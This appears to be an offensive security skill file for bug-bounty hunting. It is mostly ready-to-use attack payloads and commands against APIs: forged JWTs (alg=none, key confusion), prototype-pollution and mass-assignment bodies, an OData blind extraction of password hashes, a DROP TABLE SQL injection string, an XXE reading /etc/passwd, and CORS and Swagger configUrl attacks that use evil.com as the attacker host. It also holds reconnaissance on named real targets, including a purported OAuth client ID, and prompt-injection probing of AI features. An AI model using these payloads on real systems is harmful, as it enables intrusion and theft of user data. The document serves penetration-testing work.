---
name: hunt-api-misconfig
description: "Hunt API security misconfiguration — mass assignment, JWT attacks, prototype pollution, CORS, HTTP verb tampering. Mass assignment: send {is_admin:true, role:admin, verified:true} on profile/account/reset endpoints — server blindly applies. JWT: alg=none, weak HMAC bruteforce, kid path traversal, JWK injection, token confusion. Prototype pollution: __proto__ injection in JSON merge / Object.assign / lodash _.merge → polluted prototype reaches sink (RCE in Node, XSS in browser). CORS: wildcard with credentials, null origin, regex with subdomain takeover, postMessage origin checks. HTTP verb: GET-bypass-CSRF, X-HTTP-Method-Override, TRACE enabled. Detection: API responses with extra fields, JWTs in headers (decode at jwt.io), CORS preflight responses. Use when hunting API misconfigs, JWT flaws, mass-assignment, prototype pollution, CORS bypasses."
---

## 12. API SECURITY MISCONFIGURATION

### Mass Assignment
```javascript
User.update(req.body)  // body has {"role": "admin"} → privilege escalation
```

### JWT None Algorithm
```python
header = {"alg": "none", "typ": "JWT"}
payload = {"sub": 1, "role": "admin"}
token = base64(header) + "." + base64(payload) + "."  # no signature
```

### JWT RS256 → HS256 Algorithm Confusion
```python
# Get server's public key from /.well-known/jwks.json
# Sign token with public key as HMAC secret
token = jwt.encode({"sub": "admin", "role": "admin"}, pub_key, algorithm="HS256")
# Server uses RS256 key as HS256 secret → accepts it
```

### Prototype Pollution
```javascript
// Server-side — Node.js merge without protection
{"__proto__": {"admin": true}}
{"constructor": {"prototype": {"admin": true}}}
// URL: ?__proto__[isAdmin]=true&__proto__[role]=superadmin
```

### CORS Exploitation
```bash
# Test: reflected origin + credentials
curl -s -I -H "Origin: https://evil.com" https://target.com/api/user/me
# If: Access-Control-Allow-Origin: https://evil.com + Access-Control-Allow-Credentials: true
# → CRITICAL: attacker reads credentialed responses
```

---

## OData $filter / $select / $expand WAF-Blacklist Bypass (2024-2026 surface)

OData (Open Data Protocol) is the query layer behind **SharePoint, Microsoft Dynamics 365 / Power Platform, SAP NetWeaver Gateway / Fiori,** and any ASP.NET WebAPI project using `Microsoft.AspNetCore.OData`. It exposes SQL-shaped query operators (`eq`, `ne`, `and`, `or`, `substringof`, `startswith`, `tolower`, `concat`, `replace`) that look SQL-ish but are NOT SQL — meaning keyword-blacklist WAFs routinely fail open on OData traffic.

### Attack class 1 — Boolean-logic blind extraction via `startswith` / `substringof`

```
GET /_api/data/contacts?$filter=startswith(adx_identity_passwordhash,'a')
GET /_api/data/contacts?$filter=startswith(adx_identity_passwordhash,'aa')
```

Iterate prefix character-by-character; cardinality of the response (or `@odata.count`) is the boolean oracle that confirms the prefix is correct. No SQLi engine needed, no `'`/`--` characters — the WAF sees only legitimate OData keywords. Extracted Microsoft Dynamics 365 / Power Apps Portals **password hashes, names, emails, addresses, financial data** in Dec 2023; Microsoft patched May 2024. ([Stratus Security writeup](https://www.stratussecurity.com/post/critical-microsoft-365-vulnerability), [The Hacker News coverage Jan 2025](https://thehackernews.com/2025/01/severe-security-flaws-patched-in.html))

### Attack class 2 — `$orderby` / `$select` column-disclosure bypass

```
GET /api/data/v9.0/contacts?$orderby=emailaddress1 desc&$select=fullname
```

`$orderby` accepts column names the user has no `$select` permission for, but the engine still sorts on them — the returned order leaks the protected column. Column-level ACLs are enforced on the projection (`$select`) but NOT on `$orderby` / `$filter` — same protected column, different code path. Second Stratus finding in the same Dynamics 365 disclosure; "more dangerous than the first because it directly returned the data" per Stratus.

### Attack class 3 — `$batch` multipart/mixed → per-request WAF signatures miss sub-operations

```
POST /odata/$batch  Content-Type: multipart/mixed; boundary=batch_1
--batch_1
Content-Type: application/http
GET Users?$filter=1 eq 1 HTTP/1.1
--batch_1--
```

WAFs that scan only the outer request body (or that don't natively parse `multipart/mixed`) skip every inner operation. ModSecurity refused `multipart/mixed` historically ([Issue #3296](https://github.com/owasp-modsecurity/ModSecurity/issues/3296)); F5 added native batch parsing only in Advanced WAF v16.1 ([F5 SAP-Fiori advisory](https://www.f5.com/company/blog/securing-sap-fiori-http-batched-requests-odata-with-f5-advance)). The 2025 WAFFLED paper ([arXiv 2503.10846](https://arxiv.org/html/2503.10846v1)) generalises the parsing-discrepancy bypass class across 5 major WAFs.

### Attack class 4 — Encoded / non-canonical operator → keyword-blacklist bypass

```
GET /api?%24filter=Name%20eq%20'x'%20or%201%20eq%201   # URL-encoded $
GET /api?%2524filter=...                                # double-encoded
GET /Users(1)/$value                                    # path-segment style
```

Mixed-case operators (`Eq`, `EQ`) and obscure ones (`substringof`, `tolower`, `concat`, `replace`) look unlike `SELECT`/`UNION` so SQLi-keyword signatures never fire. WAFs that key on the literal string `$filter` see neither form — but the OData server normalises both before evaluating the predicate. Documented since Kalra Black Hat AD 2012; canonical OData-vs-WAF impedance mismatch. ([OWASP Double Encoding](https://owasp.org/www-community/Double_Encoding))

### Attack class 5 — OData → real SQLi when library passes filter raw

```
$filter=Name eq 'x'); DROP TABLE Users--'
```

Only triggers when the OData layer string-concatenates into SQL instead of using LINQ. Documented in [OData/WebApi Issue #2352](https://github.com/OData/WebApi/issues/2352). The XML-deserialisation variant: **CVE-2019-17554** (Apache Olingo OData 4.0.0-4.6.0, XXE via `<!DOCTYPE foo [<!ENTITY x SYSTEM "file:///etc/passwd">]>` in `application/xml` body, CVSS 7.5). DoS variant: **CVE-2018-8269** (Microsoft.Data.OData deep `$filter` recursion → stack overflow).

### Bonus — `$expand` navigation-property IDOR

```
GET /Orders?$expand=Customer($expand=PaymentMethods($expand=Card))
```

Authorisation decorators applied to top-level entity sets; the engine joins along navigation properties without re-checking ACL on the joined entity. Same root cause as the 2021 PowerApps Portals 38M-record mass leak ([UpGuard writeup](https://www.upguard.com/breaches/power-apps)).

### Detection heuristics

- Response headers: `OData-Version: 4.0` / `DataServiceVersion: 3.0`; URL paths `/_api/`, `/odata/`, `/_vti_bin/`, `/api/data/v9.x/`, `/sap/opu/odata/`.
- Try `$metadata` → if anonymous, the full schema (entity sets, navigation properties, function imports) is yours.
- Probe each entity set with `$filter=1 eq 1`, `$top=1`, `$select=*`, then `$orderby=<column-you-shouldnt-see>` for column-level ACL.
- Send the same payload three ways (`$filter=`, `%24filter=`, `%2524filter=`) and through `$batch` — divergent WAF behaviour confirms the parser-discrepancy bug.

---

## NSwag / Swagger / OpenAPI Spec Exposure (2024-2026 surface)

NSwag is the Swagger/OpenAPI toolchain for ASP.NET Core. Default routes (`/swagger`, `/swagger/v1/swagger.json`, `/swagger/index.html`) ship enabled in many .NET 6/7/8 projects and developers leave them on in production. The exposed spec discloses every endpoint, HTTP methods, parameter names + types + formats + max-lengths, models, validation rules — a complete attack-map in JSON.

### Default discovery paths (cross-references `web2-recon`)

```
# NSwag / Swashbuckle (ASP.NET Core)
/swagger, /swagger/index.html, /swagger/v1/swagger.json, /swagger/v2/swagger.json, /swagger/v3/swagger.json
/swagger-ui, /swagger-ui/, /swagger-ui.html, /api-docs
/nswag, /nswag/index.html, /api/swagger, /api/swagger.json, /api/openapi.json

# Generic OpenAPI
/openapi, /openapi.json, /openapi.yaml, /.well-known/openapi.json

# Java / Spring (Springfox / springdoc)
/v2/api-docs, /v3/api-docs, /v3/api-docs.yaml, /swagger-resources

# Python (FastAPI / Connexion)
/docs, /redoc, /openapi.json

# Quarkus
/q/openapi, /q/swagger-ui

# GraphQL adjacent
/graphql, /graphiql, /playground, /altair, /voyager
```

Tools: `kiterunner` natively eats OpenAPI; `sj` (Swagger Jacker), `apidetector`, `XSSwagger`.

### Attack chains

**A. Spec disclosure → mass IDOR / BOLA.** Spec lists every `GET /api/v1/users/{userId}/...`. `jq '.paths | keys' swagger.json` → swap `{userId}` for victim's ID via Autorize/`ffuf -mc 200`. Common case: spec leaks `/api/admin/users/{id}/reset-password` documented but missing `[Authorize(Roles="Admin")]` on the controller — low-priv ATO.

**B. Spec disclosure → mass-assignment payload construction.** `components.schemas.UserUpdateDto` enumerates every model field including `isAdmin`, `emailVerified`, `tenantId`, `role`. Attacker copies the schema verbatim into `PATCH /users/me` and adds the privileged fields. Server's `[FromBody]` binder accepts them when DTOs aren't split into read-vs-write models.

**C. Hidden endpoints.** Specs document `/internal/*`, `/debug/*`, `/v0/*`, `/legacy/*` routes that no front-end UI references. Reachable but uncovered by WAF rules and often skipped during auth reviews.

**D. Swagger UI configUrl takeover.** Swagger UI loads its config from `?configUrl=`. If unsanitised, attacker hosts an evil OpenAPI spec, sends victim a link to the *legitimate* Swagger UI with `?configUrl=https://evil/spec.json`. Spec routes point back at the legitimate origin so the victim's "Try It Out" clicks fire same-origin authenticated requests. ([HackerOne #3124103 — U.S. DoD Swagger UI Injection, May 2025](https://hackerone.com/reports/3124103))

### Disclosed cases

- **CVE-2018-25031** — Swagger UI ≤ 4.1.2 spec-injection via URL parameter; affects org.webjars:swagger-ui broadly (embedded in Swashbuckle and NSwag bundles).
- **Swagger UI DOM XSS (3.14.1 → 3.38.0)** — outdated bundled DOMPurify + remote-spec-load → arbitrary JS in victim browser ([Vidoc Security Lab writeup](https://blog.vidocsecurity.com/blog/hacking-swagger-ui-from-xss-to-account-takeovers), [PortSwigger Daily Swig](https://portswigger.net/daily-swig/widespread-swagger-ui-library-vulnerability-leads-to-dom-xss-attacks)). Reported live on PayPal, Atlassian, Microsoft, GitLab, Yahoo.
- **HackerOne #3124103** — U.S. Department of Defense, Swagger UI Injection (May 2025).
- **HackerOne #2534300** — Ionity GmbH, HTML injection in Swagger UI.
- **HackerOne #1656650** — Reflected XSS via Swagger UI `url=` parameter.
- **CloudSEK threat-intel (2024)** — actors abuse exposed `swagger-ui` to invoke a verified-business WhatsApp send-message endpoint, impersonating the company to its customers. 6,000+ exposed Swagger UI instances on Shodan at time of writing. ([CloudSEK report](https://www.cloudsek.com/threatintelligence/threat-actors-use-exposed-swagger-ui-to-misuse-a-companys-endpoints-and-target-customers))
- **CVE-2023-38337** — `rswag` (Ruby Swagger toolchain) directory traversal — reminder that the spec endpoint is itself an attack surface.

### Detection checklist

1. httpx-probe every path above across the full subdomain set; flag 200 with `Content-Type: application/json` AND body matching `"swagger"` or `"openapi"`.
2. For every hit: `jq '.paths | keys' swagger.json` → feed to kiterunner / Autorize.
3. `jq '.components.schemas' swagger.json` → mass-assignment field candidates.
4. Banner the Swagger UI HTML for version string; map to the CVE-2018-25031 / DOM-XSS table.
5. Test `?configUrl=` and `?url=` parameter handling on every Swagger UI hit.

---

---

## Zendesk / Help Center API Recon (2024-2026 surface)

Zendesk is the most common customer-support SaaS behind enterprise and mid-market targets. Its public REST API is a rich source of **API misconfigurations** — no auth required for Help Center content, Content-Type bypasses, and ticket-form exposure.

### Endpoint Discovery

Zendesk instances are typically at `{subdomain}.zendesk.com` or behind a CNAME (`support.target.com` → `target.zendesk.com`). Verify via:

```bash
# Direct API check
curl -s -o /dev/null -w "%{http_code}" "https://target.zendesk.com/api/v2/help_center/categories.json"
# Proxy/CNAME check (follow redirects)
curl -sL -o /dev/null -w "%{http_code}" "https://support.target.com/api/v2/help_center/categories.json"
```

Zendesk brands (multi-tenant) may serve content from different subdomains while the API is at the canonical `.zendesk.com` host.

### Sibling Domain API Recon

When a target owns multiple domains (e.g., Indeed owns indeed.com, resume.com, wowjobs.ca, indeedflex.com, indeed.tech, indeed.net), extend recon to sibling properties:

1. Check scope list for all owned domains (Bugcrowd/HackerOne program page)
2. Run the same subdomain recon + JS bundle analysis + GraphQL endpoint discovery on each sibling
3. Sibling domains often use the same auth backend (e.g., Indeed OAuth for resume.com) and may share API infrastructure
4. Country subdomains (fr.indeed.com, de.indeed.com, etc.) may expose localized versions with different auth requirements — enumerate all country codes
5. Example: Indeed's Bugcrowd scope includes `resume.com`, `wowjobs.ca`, `*.indeedflex.com`, `*.indeed.tech`, `*.indeed.net` — all 17 targets should be reconned independently

### Help Center API (Public, No Auth)

The Help Center API is intentionally public by default. Full schema: `/api/v2/help_center/{locale?}/`:

```bash
# Enumerate categories
curl -s "https://target.zendesk.com/api/v2/help_center/categories.json"

# Sections within a category
curl -s "https://target.zendesk.com/api/v2/help_center/categories/{id}/sections.json"

# Articles (paginated)
curl -s "https://target.zendesk.com/api/v2/help_center/categories/{id}/articles.json?per_page=100"
curl -s "https://target.zendesk.com/api/v2/help_center/sections/{id}/articles.json?per_page=100"

# Individual article body (strips HTML in body field)
curl -s "https://target.zendesk.com/api/v2/help_center/articles/{id}.json"
```

**Locale redirect**: Some instances redirect `/api/v2/help_center/articles/{id}.json` → `/api/v2/help_center/en-us/articles/{id}.json`. Follow the redirect.

**Attack surface from Help Center API**:
- Articles may leak internal documentation, changelogs, or config details
- Article bodies may contain internal tool references, API endpoints, or hidden features
- Articles about security/integrations (ChatGPT, OAuth, SSO) reveal integration patterns
- Old/disused categories and sections may reference retired features

### Ticket Forms Exposure (Critical Info Disclosure — Common Bug)

Zendesk ticket forms API is **not** meant to be public, but it's commonly exposed when called with the correct `Content-Type` header. Default requests (no Accept/Content-Type) return **415 Unsupported Media Type**. Adding proper headers returns full data:

```bash
# 415 without proper headers
curl -s "https://target.zendesk.com/api/v2/ticket_forms"
# → {"error":"Unsupported Media Type"}

# 200 with proper Content-Type
curl -s "https://target.zendesk.com/api/v2/ticket_forms" \
  -H "Content-Type: application/json"
# → {"ticket_forms": [{...all forms...}]}
```

**What ticket forms leak**:

| Information | Sensitivity |
|---|---|
| Internal form names (e.g. "Visibility Appeal", "IHP Support - Convert Existing Job") | Internal workflow disclosure |
| Field IDs (`ticket_field_ids: [21791994, ...]`) | Internal data model |
| Conditional logic (`end_user_conditions` with `parent_field_id` + `value` → `child_fields`) | Business rules / validation bypass surface |
| Brand restrictions (`restricted_brand_ids: []` = no restriction) | Which forms accessible to any user |
| Partner names (embedded in form names) | Business relationship disclosure |
| Active vs inactive forms (`active: true/false`) | Which forms are in current use |
| Dynamic content placeholders (`{{dc.my_form}}`) | Template injection surface |
| `end_user_visible: true` | Forms visible to unauthenticated users |

**Validation**: Ticket forms exposure alone = Info/Medium (internal workflow disclosure). Escalate to High/Critical if:
- A form with `restricted_brand_ids: []` allows unauthenticated ticket submission
- Field IDs correspond to admin-only fields accessible via IDOR
- Form data includes PII or credential fields

### API Endpoint Auth Probing

Zendesk uses different auth requirements per endpoint. Probe systematically:

```bash
# Help Center — public (no auth)
/api/v2/help_center/categories.json → 200
/api/v2/help_center/articles.json → 200 (may redirect to locale variant)

# Ticket Forms — public with Content-Type bypass
/api/v2/ticket_forms → 415 → 200 with Content-Type: application/json
/api/v2/ticket_fields → 401 (requires auth)
/api/v2/user_fields → 401

# Search — requires auth
/api/v2/search.json?query=test → 401

# Also check: different Accept header values, OAuth token from public docs,
# API keys in Help Center articles or JS bundles
```

### References

See `references/zendesk-recon-cases.md` for concrete case studies (Indeed, etc.).

---

---

## GraphQL IDOR Testing Methodology

GraphQL APIs are a rich source of IDOR vulnerabilities. Unlike REST, the entire data model is enumerable via introspection — and auth is often inconsistently applied across fields.

### Phase 1: Schema Discovery

```bash
# Try introspection (public by default — many miss locking it down)
curl -s "https://target.com/graphql" -X POST \
  -H "Content-Type: application/json" \
  -d '{"query":"{ __schema { queryType { fields { name args { name type { name } } type { name ofType { name } } } } mutationType { fields { name args { name type { name } } type { name ofType { name } } } } types { name kind fields { name type { name ofType { name } } } inputFields { name type { name } } } } }"}'

# Or use OpenAPI-adjacent discovery (see NSwag/Swagger section above)
# GraphQL playground UIs
/graphql, /graphiql, /playground, /altair, /voyager
```

**If introspection is blocked**, try:
- `{ __typename }` — always returns a valid response if the endpoint is GraphQL
- `{ _service { sdl } }` — Apollo Federation schema
- `query IntrospectionQuery { __schema { ... } }` with `operationName=IntrospectionQuery`

**Compact introspection for large schemas**: Full introspection queries (>2000 chars) can trigger rate limits or timeouts on slower GraphQL servers. Prefer focused queries that target specific types:

```bash
# Get only Query field names + args
curl -s ".../graphql" -d '{"query":"{ __schema { queryType { fields { name args { name type { name kind ofType { name kind } } } type { name ofType { name } } } } } }"}'

# Get only Mutation field names + args
curl -s ".../graphql" -d '{"query":"{ __schema { mutationType { fields { name args { name type { name kind ofType { name kind } } } type { name ofType { name } } } } } }"}'

# Get a specific type's fields
curl -s ".../graphql" -d '{"query":"{ __schema { types { name fields { name type { name } } } } }"}'
```

**Focused introspection is faster and less likely to time out** than the full schema dump in one request. Parse the compact output, then query specific types of interest one at a time.

### Phase 2: Auth Layer Mapping

GraphQL auth is often field-level, not endpoint-level. Map auth requirements systematically:

| Auth Level | Typical Behaviour | Example |
|---|---|---|
| **PUBLIC** | Works with no headers at all | `Suggestions { skills }`, `{ __typename }` |
| **SESSION** | Works with only browser cookies | `User`, `Counter`, `health` |
| **JWT** | Returns "No JWT was supplied" | `Resume`, `CoverLetter` |

```bash
# 1. No auth
curl -s "https://target.com/graphql" -X POST \
  -H "Content-Type: application/json" \
  -d '{"query":"{ health { success } }"}'

# 2. Session auth (copy cookies from browser)
curl -s "https://target.com/graphql" -X POST \
  -H "Cookie: <session-cookie>" \
  -H "Content-Type: application/json" \
  -d '{"query":"{ User { id accountEmail firstName lastName } }"}'

# 3. JWT auth
curl -s "https://target.com/graphql" -X POST \
  -H "Authorization: Bearer *** \
  -H "Content-Type: application/json" \
  -d '{"query":"{ Resume { id userId contactDetails { firstName lastName email } } }"}'
```

**Key insight**: GraphQL mutations named after types (e.g. `User`, `Resume`) that take an `id: ID` argument may be fetchers, not creators. Test by passing your own ID first, then random UUIDs — if it reflects back any ID you give it, it's likely not enforcing auth.

### Phase 3: JS Bundle Analysis — SPA/Gatsby Deep Dive

For SPA-driven sites (React, Gatsby, Next.js), JS bundles contain GraphQL operation names, OAuth client IDs, hidden routes, and API endpoints. This phase is essential because SPA bundles bundle all frontend code into downloadable chunks.

**Gatsby SPA caveat**: Gatsby sites render content client-side via JavaScript. The browser snapshot tool may show "(empty page)" even though the page rendered. **Always use `browser_console` with `document.body.innerText` or `document.querySelectorAll(...)` to inspect rendered content**, not just the accessibility snapshot. Elements exist in the DOM but the snapshot may not capture them.

**JS chunk discovery**:
```bash
# Gatsby route naming convention — extract page routes from main bundle
grep -oP 'component---src-pages-[\w-]+-tsx' main-bundle.js
# Example output:
#   component---src-pages-signin-index-tsx
#   component---src-pages-indeed-oauth-index-tsx
#   component---src-pages-usertoken-tsx
#   component---src-pages-connecttoken-tsx

# Each chunk is downloadable at:
# /component---src-pages-{name}-{hash}.js
```

**What to extract from JS bundles**:
```bash
# OAuth client IDs — test for CSRF, redirect URI bypass, PKCE gaps
grep -oP 'client_id=([a-f0-9]+)' bundle.js

# Auth endpoints and redirect URIs
grep -oP '(?:authorizationUrl|tokenUrl|clientId|redirectUri)[\"\']?\s*[:=]\s*[\"\']([^\"\']+)' bundle.js

# GraphQL endpoints — may differ from standard paths
grep -oP '[\"\'](https?://[^\"\']*graphql|/graph/[^\"\']*)[\"\']' bundle.js

# Hidden routes — pages that no UI links to
grep -oP 'component---src-pages-[\w-]+-tsx' bundle.js

# Hardcoded tokens, API keys
grep -oP '(?:api[_-]?key|token|secret)[\"\']?\s*[:=]\s*[\"\']([a-f0-9]{20,})' bundle.js

# localStorage keys (for post-auth storage locations)
grep -oP 'localStorage\.(?:getItem|setItem|removeItem)\s*\(\s*[\"\']([^\"\']+)[\"\']' bundle.js
```

**OAuth flow reconstruction from JS**:
```
# Pattern from Indeed/Resume.com:
1. Click "Continue with Indeed" 
2. Generate random state: Math.random().toString(36)
3. Build URL: https://secure.indeed.com/oauth/v2/authorize?
     client_id=XXX&redirect_uri=https://app.com/oauth/callback&
     response_type=code&state=STATE&scope=email+offline_access
4. Redirect browser to Indeed
5. Callback receives code + state via URL params
6. POST/GET to /indeed/oauth/?code=CODE&state=STATE
7. Response includes accessToken, refreshToken
8. Store in localStorage + redirect to dashboard
```

**Deeper analysis — download and inspect**: Download page-specific JS chunks and search for GraphQL queries, mutation names, input object structures, and argument names. This reveals API behaviour without needing introspection:

```bash
curl -s "https://target.com/component---src-pages-signin-index-tsx-{hash}.js" | \
  grep -oP '(?:mutation|query)\s+\w+' | sort -u
```

### Phase 4: IDOR Probe

```bash
# Test with known user ID (from guest session or registration)
curl -s "https://target.com/graphql" -X POST \
  -d '{"query":"mutation { User(id: \"your-own-id\") { id accountEmail firstName lastName } }"}'

# Test with random UUID — compare response
curl -s "https://target.com/graphql" -X POST \
  -d '{"query":"mutation { User(id: \"00000000-0000-0000-0000-000000000000\") { id accountEmail firstName lastName } }"}'

# Test with sequential IDs if UUID is guessable
# Test with ID=1, ID=empty string, ID=null, ID=nonexistent
```

**Response analysis**:
- If random UUID returns `null` for all fields OR the same shape as your own ID, no IDOR (just reflecting input or returning empty)
- If random UUID returns **different data** than your session should see → **IDOR confirmed**
- If error messages differ between your ID and random IDs → user enumeration

**Guest session IDs**: Some apps auto-create guest users (stored in localStorage as `resume_user: {"id":"uuid",...}`). Use this ID as your baseline for IDOR testing before authentication.

### Phase 5: Deepen the Surface

Once you find an accessible query/mutation:

1. **List all fields** available on the returned type (from introspection schema)
2. **Probe for nested objects** that may contain sensitive relations (e.g. `User { IndeedResponse { accessToken refreshToken } }`)
3. **Test mutation inputs** — some mutations accept input objects that may bypass write controls
4. **Check for AI-powered features** (text generation, autocomplete) — these may have SSRF or injection vulnerabilities
5. **Search for auth bypass** — some queries work with session cookies when they should require JWT, or vice versa

### Phase 6: AI Feature & Public Query Testing

Many GraphQL APIs expose AI-powered features (Suggestions, Autocomplete, text generation) that are publicly accessible or require only session auth. These are independent attack surface even when the core data queries are locked down.

```bash
# Test public AI features (no auth):
curl -s "https://target.com/graphql" -X POST \
  -H "Content-Type: application/json" \
  -d '{"query":"{ Suggestions { skills { results } } }"}'

# Test with arguments for injection
curl -s "https://target.com/graphql" -X POST ... \
  -d '{"query":"{ Suggestions { tweakify(jobDescription: \"injection test\") { suggestion } } }"}'

# Test autocomplete — may leak searchable data
curl -s "https://target.com/graphql" -X POST ... \
  -d '{"query":"{ Autocomplete { jobTitle { results } skillName { results } companyName { results } location { results { formatted } } } }"}'

# Test template/text generation — may expose pre-written content
curl -s "https://target.com/graphql" -X POST ... \
  -d '{"query":"{ Suggestions { SummaryText { results } EmploymentText(jobTitle: \"Software Engineer\") { results } } }"}'
```

**Testing methodology for AI endpoints**:
1. Test prompt injection in text arguments — `tweakify(jobDescription:)` may accept user text and pass it to an LLM
2. Test for SSRF — if AI features fetch URLs or make external calls, this is a high-value finding
3. Test for data leakage — AI features may return cached data from other users or internal systems
4. Test error handling — malformed input may leak stack traces or internal configuration
5. **Negative findings are valuable**: If guardrails hold against injection, note it — the pattern is still worth documenting for the next target that may not have guardrails

**Common AI argument names to test**: `jobDescription`, `workExperience`, `experience`, `text`, `input`, `content`, `description`, `jobTitle`, `company`, `targetCompany`, `position`, `jobCategory`, `summary`, `skills`

For each, try both the correct argument (found via JS or introspection) and injection payloads in the argument value.

### Disclosed Cases

- **Indeed / Resume.com (2026)** — GraphQL introspection enabled, User query works with session cookies, Resume requires JWT. OAuth client ID discovered in Gatsby JS bundle: `24cf570e641a1fe08a0500e36aa840ab24c959b92ba1`. Suggestions API public (skills, summary text, career advice templates). AI tweakify feature accepts jobDescription argument for LLM-powered resume improvement. See `references/zendesk-recon-cases.md` and `references/graphql-idor-procedure.md`.
- **General pattern**: Multiple reports on HackerOne/Bugcrowd for GraphQL introspection + IDOR chains (Tesla, Shopify, GitHub, GitLab have had variations).

---

## Related Skills & Chains

- **`hunt-ato`** — Mass assignment on signup/profile is the fastest path to admin. Chain primitive: API mass assignment + `hunt-ato` → `role=admin` set on signup → ATO via privileged role on first login.
- **`hunt-auth-bypass`** — JWT flaws collapse the entire auth layer. Chain primitive: JWT `alg=none` + `hunt-auth-bypass` → impersonate any user by setting `sub` to victim ID, no signature required.
- **`hunt-rce`** — Prototype pollution gadgets in Node.js dependencies (lodash, mongoose, jQuery) reach `child_process.spawn`. Chain primitive: Prototype pollution (`__proto__.shell=true`) + `hunt-rce` (Node.js gadget chain) → RCE on the API node.
- **`hunt-subdomain`** — CORS regex with wildcard subdomain trusts a takeoverable host. Chain primitive: CORS allowlist `*.target.com` + subdomain takeover → attacker-controlled origin reads credentialed API responses.
- **`security-arsenal`** — Load the JWT Attack Payloads section (alg=none, kid path traversal, JWK injection, embedded JWK) and the Mass-Assignment Field Wordlist (`is_admin`, `role`, `verified`, `permissions`, `org_id`, `tenant_id`).
- **`triage-validation`** — Apply the Server-Policy-vs-State gate: a permissive CORS header alone is informational; demonstrate actual cross-origin credentialed read of sensitive data before reporting.
- **`hunt-llm-ai`** — Zendesk articles about ChatGPT integrations and AI-powered features (e.g. Indeed App on ChatGPT, AI Recruiter Questions) are directly relevant LLM attack surface — see `hunt-llm-ai` for testing methodology.
- **`indeed-recon-results`** — Session-specific findings for Indeed/Resume.com recon, including full subdomain map and GraphQL schema dump.
